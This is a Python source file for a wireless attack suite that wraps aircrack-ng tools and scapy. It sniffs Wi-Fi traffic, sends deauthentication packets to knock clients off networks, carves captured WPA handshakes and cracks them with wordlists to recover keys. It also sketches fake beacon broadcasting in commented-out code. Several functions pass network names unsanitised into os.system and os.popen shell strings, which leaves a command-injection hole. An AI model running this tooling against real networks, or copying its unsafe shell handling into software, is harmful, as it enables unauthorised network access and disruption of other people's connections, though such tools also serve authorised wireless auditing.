#!/usr/bin/env python3
from subprocess import Popen, PIPE
from scapy.all import sendp, PcapReader
import string
import random
import signal
import csv
import os

class Airosuite:
	"""Wireless Suite utilizing: Aircrack, Airodump, Aireplay, Macchanger"""
# ------------------------------------------------------
# Process Control
# ------------------------------------------------------
	def __init__(self, channel, interface, epoch): # {{{
		"""Initialize an Airodump Process args: (str(channels), str(interface), epoch)"""
		self.seed = ''.join(random.choice(string.ascii_letters) for i in range(10))
		self.epoch = str(epoch)
		self.channel = channel
		self.interface = interface
		self.csvfile = '/tmp/'+self.seed+'-01.csv'
		self.capfile = '/tmp/'+self.seed+'-01.cap'
		self.blankfile = '/tmp/'+self.seed+'.blank'
		self.beacon_cache = {}
	# }}}
	def open(self, savetodisk=False): # {{{
		"""Begins Airodump"""
		cmd='airodump-ng -a -w /tmp/'+str(self.seed)+' --output-format pcap,csv --write-interval 2 -c '+str(self.channel)+' '+str(self.interface)
		self.dump_process=Popen(cmd.split(' '), stdin=PIPE, stdout=open('/dev/null', 'w'), stderr=open('/dev/null', 'w'))
		if savetodisk:
			if not os.path.exists('caps'):
				os.mkdir('caps')
			os.system('ln '+self.capfile+' caps/ch-'+self.channel+'_'+self.epoch+'.cap')
	# }}}
	def pause(self): # {{{
		os.kill(self.dump_process.pid, signal.SIGSTOP)
	# }}}
	def resume(self): # {{{
		os.kill(self.dump_process.pid, signal.SIGCONT)
	# }}}
	def close(self): # {{{
		"""Closes Airodump"""
		self.dump_process.terminate()
	# }}}
	def parse(self): # {{{
		"""Parses Airodumps CSV File"""
		items = { 'access_points': [], 'clients': [] }
		#read file, line by line
		lines = []
		with open(self.csvfile, 'r') as csv_file:
			for line in csv_file:
				line = line.replace('\0', '') #replace null chars
				lines.append(line)
		#parse csv content
		csv_lines = csv.reader(lines,
								delimiter=',',quoting=csv.QUOTE_ALL,
								skipinitialspace=True,escapechar='\\')
		# check each csv_line for usable data
		client_part = False # denotes if we reached the clients part
		for line in csv_lines:
			if len(line) == 0: continue
			if line[0].strip() == 'BSSID': continue
			if line[0].strip() == 'Station MAC':
				client_part = True
				continue
			if client_part:
				items['clients'].append(line)
			else:
				items['access_points'].append(line)
		# return our findings
		return items
	# }}}

# ------------------------------------------------------
# Data Actions
# ------------------------------------------------------
	def parse_auths(self): # {{{
		return os.popen("tshark -r "+self.capfile+" -T fields -E separator='|' -e 'wlan.bssid' -e 'wlan.ta' -Y 'wlan.fc.type_subtype == 11' 2> /dev/null").read().strip().split('\n')
	# }}}
	def sendpacket(self, packet): # {{{
		"""Sends a Packet"""
		sendp(packet, iface=self.interface, verbose=0)
	# }}}
	def deauth(self, essid, bssid, mac): # {{{
		"""Sends a Deauth Packet"""
		cmd='aireplay-ng -0 1 -D --ignore-negative-one -a '+str(bssid)+' -c '+str(mac)+' -e '+str(essid)+' '+str(self.interface)
		Popen(cmd.split(' '), stdin=PIPE, stdout=PIPE, stderr=PIPE)
	# }}}
	def check_handshake(self, essid, bssid): # {{{
		"""Checks if Aircrack thinks it can crack a Handshake"""
		if not os.path.exists(self.blankfile):
			#Popen(str('echo " " > '+self.blankfile).split(' '))
			os.system('echo " " > '+self.blankfile)
		cmd='aircrack-ng -a 2 -w '+self.blankfile+' -b '+str(bssid)+' -e '+str(essid)+' /tmp/'+str(self.seed)+'-01.cap'
		proc = Popen(cmd.split(' '), stdin=PIPE, stdout=PIPE, stderr=PIPE)
		rc = proc.wait(timeout=5)
		if rc == 0:
			# carve handshake
			self.carve_handshake(essid, bssid)
			return True
		else:
			return False
	# }}}
	def carve_handshake(self, essid, bssid): # {{{
		fbssid = bssid.replace(':','')
		fessid = ''.join(filter(str.isalnum, essid))
		fname = 'hs_'+fbssid+'_'+fessid+'.cap'
		if os.path.exists('hs'):
			fname = 'hs/'+fname
		#tshark -r /tmp/omyWNdfRvKv -R "(wlan.fc.type_subtype == 8 || wlan.fc.type_subtype == 5 || eapol) && (wlan.bssid == 90:AA:C3: || wlan.addr == 90:AA:C3:)" -2 -F pcap -w asdfasdf2.cap
		#cmd=str('tshark -r '+self.capfile+' -R "(wlan.fc.type_subtype == 8 || wlan.fc.type_subtype == 5 || eapol) && (wlan.bssid == '+bssid+' || wlan.addr == '+bssid+')" -2 -F pcap -w '+fname)
		cmd=str('tshark -r '+self.capfile+' -R "(wlan.fc.type_subtype == 0x00 || wlan.fc.type_subtype == 0x02 || wlan.fc.type_subtype == 0x04 || wlan.fc.type_subtype == 0x05 || wlan.fc.type_subtype == 0x08 || eapol) && (wlan.bssid == '+bssid+' || wlan.addr == '+bssid+')" -2 -F pcap -w '+fname+' > /dev/null 2>&1')
		os.system(cmd)
	# }}}

# ------------------------------------------------------
# Future Actions (yet to be written)
# ------------------------------------------------------
	def beacon(self, ssid, bssid): # {{{
		"""Transmits a fake Beacon, for beacon swarming"""
		pass
		#rsn = Dot11Elt(ID='RSNinfo', info=(
		#	'\x01\x00'              #RSN Version 1
		#	'\x00\x0f\xac\x02'      #Group Cipher Suite : 00-0f-ac TKIP
		#	'\x02\x00'              #2 Pairwise Cipher Suites (next two lines)
		#	'\x00\x0f\xac\x04'      #AES Cipher
		#	'\x00\x0f\xac\x02'      #TKIP Cipher
		#	'\x01\x00'              #1 Authentication Key Managment Suite (line below)
		#	'\x00\x0f\xac\x02'      #Pre-Shared Key
		#	'\x00\x00'))            #RSN Capabilities (no extra capabilities)
		#beacon = Dot11Beacon(cap="ESS", timestamp=1)
		#sender = bssid
		## Create paquet
		#dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
		#addr2=sender, addr3=sender)
		#essid = Dot11Elt(ID='SSID',info=ssid, len=len(ssid))
		#frame = RadioTap()/dot11/beacon/essid/rsn
		## Send Packet
		#sendp(frame, iface=iface, inter=0.010, loop=0, verbose=1, count=8)
	# }}}
	def probe(self, essid, mac): # {{{
		"""Transmits a probe request"""
		pass
	# }}}
	def crack(self, essid, bssid, wordlist): # {{{
		"""Attempts to crack handshake via wordlists"""
		fbssid = str(bssid.replace(':',''))
		fessid = str(''.join(filter(str.isalnum, essid)))
		hsfname = str('hs_'+fbssid+'_'+fessid+'.cap')
		keyfname = str(fbssid+'_'+fessid+'.key')
		#aircrack-ng -a 2 -w "$wordlist" -l "keys/${maca}_${ssid}.key" "hs/$hs"
		if not os.path.exists('keys'): os.mkdir('keys')
		if os.path.exists(wordlist):
			cmd='aircrack-ng -a 2 -w '+wordlist+' -l keys/'+keyfname+' hs/'+hsfname
			cracker=Popen(cmd.split(' '), stdin=PIPE, stdout=PIPE, stderr=PIPE)
	# }}}
